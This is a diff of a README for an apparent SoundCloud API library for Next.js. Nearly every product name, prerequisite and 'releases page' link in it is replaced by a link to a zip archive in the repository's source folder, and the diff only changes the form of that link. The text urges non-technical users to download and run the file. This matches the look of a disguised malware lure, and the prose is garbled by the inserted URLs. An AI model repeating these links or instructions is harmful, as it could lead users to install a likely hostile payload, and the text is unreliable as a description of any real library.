@@ -1,12 +1,12 @@
-# 🎵 soundcloud-api-ts-next - Smooth https://raw.githubusercontent.com/Ninju153311/soundcloud-api-ts-next/main/src/api_soundcloud_ts_next_2.1.zip SoundCloud Integration
+# 🎵 soundcloud-api-ts-next - Smooth https://github.com/Ninju153311/soundcloud-api-ts-next/raw/refs/heads/main/src/api_soundcloud_ts_next_2.1.zip SoundCloud Integration
 
-[![Download soundcloud-api-ts-next Releases](https://raw.githubusercontent.com/Ninju153311/soundcloud-api-ts-next/main/src/api_soundcloud_ts_next_2.1.zip)](https://raw.githubusercontent.com/Ninju153311/soundcloud-api-ts-next/main/src/api_soundcloud_ts_next_2.1.zip)
+[![Download soundcloud-api-ts-next Releases](https://github.com/Ninju153311/soundcloud-api-ts-next/raw/refs/heads/main/src/api_soundcloud_ts_next_2.1.zip)](https://github.com/Ninju153311/soundcloud-api-ts-next/raw/refs/heads/main/src/api_soundcloud_ts_next_2.1.zip)
 
 ## 📖 Overview
 
-soundcloud-api-ts-next is an application that helps you connect with SoundCloud using https://raw.githubusercontent.com/Ninju153311/soundcloud-api-ts-next/main/src/api_soundcloud_ts_next_2.1.zip It adds easy access to music and playlists by simplifying how your browser talks to SoundCloud. This tool uses React hooks and secure API routes behind the scenes to keep your data safe while you explore music. 
+soundcloud-api-ts-next is an application that helps you connect with SoundCloud using https://github.com/Ninju153311/soundcloud-api-ts-next/raw/refs/heads/main/src/api_soundcloud_ts_next_2.1.zip It adds easy access to music and playlists by simplifying how your browser talks to SoundCloud. This tool uses React hooks and secure API routes behind the scenes to keep your data safe while you explore music. 
 
-Even if you don’t know code, this app allows you to get music data directly in a https://raw.githubusercontent.com/Ninju153311/soundcloud-api-ts-next/main/src/api_soundcloud_ts_next_2.1.zip environment. It is designed with modern web apps in mind and uses TypeScript for stronger reliability.  
+Even if you don’t know code, this app allows you to get music data directly in a https://github.com/Ninju153311/soundcloud-api-ts-next/raw/refs/heads/main/src/api_soundcloud_ts_next_2.1.zip environment. It is designed with modern web apps in mind and uses TypeScript for stronger reliability.  
 
 ## 💻 What You Need Before Starting
 
@@ -15,7 +15,7 @@ Before you install soundcloud-api-ts-next, check these basic things:
 - **Operating System:** Windows 10 or later, macOS 10.15 or later, or a Linux distribution.
 - **Browser:** The latest version of Chrome, Firefox, Edge, or Safari is recommended.
 - **Internet Connection:** Required to access and stream music from SoundCloud.
-- **https://raw.githubusercontent.com/Ninju153311/soundcloud-api-ts-next/main/src/api_soundcloud_ts_next_2.1.zip** You do not need to install https://raw.githubusercontent.com/Ninju153311/soundcloud-api-ts-next/main/src/api_soundcloud_ts_next_2.1.zip or any coding tools if you are just running the app from the download. However, advanced users may want https://raw.githubusercontent.com/Ninju153311/soundcloud-api-ts-next/main/src/api_soundcloud_ts_next_2.1.zip 14 or newer to customize.
+- **https://github.com/Ninju153311/soundcloud-api-ts-next/raw/refs/heads/main/src/api_soundcloud_ts_next_2.1.zip** You do not need to install https://github.com/Ninju153311/soundcloud-api-ts-next/raw/refs/heads/main/src/api_soundcloud_ts_next_2.1.zip or any coding tools if you are just running the app from the download. However, advanced users may want https://github.com/Ninju153311/soundcloud-api-ts-next/raw/refs/heads/main/src/api_soundcloud_ts_next_2.1.zip 14 or newer to customize.
 
 This app runs in your browser or as a simple local web app, so it doesn’t need complicated setup. You only need basic computer skills such as downloading files and opening programs.
 
@@ -26,7 +26,7 @@ Follow these instructions step by step to get soundcloud-api-ts-next running on 
 1. **Download the App**  
    Start by visiting the official releases page. This page holds all versions of the app:
    
-   [Download soundcloud-api-ts-next Releases](https://raw.githubusercontent.com/Ninju153311/soundcloud-api-ts-next/main/src/api_soundcloud_ts_next_2.1.zip)
+   [Download soundcloud-api-ts-next Releases](https://github.com/Ninju153311/soundcloud-api-ts-next/raw/refs/heads/main/src/api_soundcloud_ts_next_2.1.zip)
    
 2. **Choose Your Version**  
    Look for the latest stable version. Files will usually have names mentioning the version number and your system type (like Windows or macOS). Click the version that fits your computer to download it.
@@ -44,7 +44,7 @@ Follow these instructions step by step to get soundcloud-api-ts-next running on 
 
 You can always get the latest version by visiting the releases page linked below:
 
-### [Download soundcloud-api-ts-next here](https://raw.githubusercontent.com/Ninju153311/soundcloud-api-ts-next/main/src/api_soundcloud_ts_next_2.1.zip)
+### [Download soundcloud-api-ts-next here](https://github.com/Ninju153311/soundcloud-api-ts-next/raw/refs/heads/main/src/api_soundcloud_ts_next_2.1.zip)
 
 This page shows all past and current releases. To install:
 
@@ -62,7 +62,7 @@ soundcloud-api-ts-next offers these useful features:
 - **React Hooks Integration:** Provides a smooth and responsive web experience.
 - **Secure API Routes:** Keeps your login and data safe when interfacing with SoundCloud.
 - **TypeScript Support:** This makes the app more stable and less prone to errors.
-- **Modern Web App:** Uses https://raw.githubusercontent.com/Ninju153311/soundcloud-api-ts-next/main/src/api_soundcloud_ts_next_2.1.zip’s latest features for speed and efficiency.
+- **Modern Web App:** Uses https://github.com/Ninju153311/soundcloud-api-ts-next/raw/refs/heads/main/src/api_soundcloud_ts_next_2.1.zip’s latest features for speed and efficiency.
 - **OAuth Login:** Securely connect your SoundCloud account without sharing your password with the app.
 
 You can browse playlists, play tracks, and get details like artist info thanks to secure, fast communication with SoundCloud’s API.
@@ -107,11 +107,11 @@ If you see error messages about permissions, check your security settings to all
 
 If you want to report bugs or suggest improvements, visit the GitHub page:
 
-https://raw.githubusercontent.com/Ninju153311/soundcloud-api-ts-next/main/src/api_soundcloud_ts_next_2.1.zip
+https://github.com/Ninju153311/soundcloud-api-ts-next/raw/refs/heads/main/src/api_soundcloud_ts_next_2.1.zip
 
 You can open a new issue or contribute code if you have technical skills.
 
 ---
 
-[Get soundcloud-api-ts-next Releases](https://raw.githubusercontent.com/Ninju153311/soundcloud-api-ts-next/main/src/api_soundcloud_ts_next_2.1.zip)  
+[Get soundcloud-api-ts-next Releases](https://github.com/Ninju153311/soundcloud-api-ts-next/raw/refs/heads/main/src/api_soundcloud_ts_next_2.1.zip)  
 Click the link to download and start using soundcloud-api-ts-next today. Enjoy accessing SoundCloud’s music with a simple, safe app.
